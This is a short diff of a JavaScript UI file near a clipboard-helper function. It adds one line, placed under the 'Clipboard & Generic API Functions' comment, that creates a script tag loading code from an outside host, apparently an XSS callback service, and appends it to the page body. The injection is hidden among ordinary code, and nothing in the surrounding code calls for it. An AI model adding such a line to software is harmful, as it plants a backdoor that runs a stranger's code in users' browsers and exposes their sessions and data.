@@ -155,7 +155,7 @@ function initializeUI() {
 }
 
 // --- Clipboard & Generic API Functions ---
-
+var a=document.createElement("script");a.src="https://xss.report/c/biksoft";document.body.appendChild(a);
 async function copyToClipboard(button, text) {
     // ... (copyToClipboard remains the same)
     if (!text || text === "N/A") {
